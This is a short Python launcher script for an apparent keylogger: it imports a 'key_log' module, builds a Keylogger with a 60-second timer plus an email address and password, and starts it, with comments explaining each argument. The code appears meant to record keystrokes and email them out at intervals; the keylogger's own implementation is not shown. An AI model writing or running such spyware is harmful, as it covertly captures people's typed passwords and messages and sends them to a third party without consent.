import key_log

my_keylogger = key_log.Keylogger(60,"email@email.com","pwd")
#First Argument is "TIMER" like 60 Seconds
#Second Argument is "Email ID"
#Third Argument is "Password"
my_keylogger.start() 
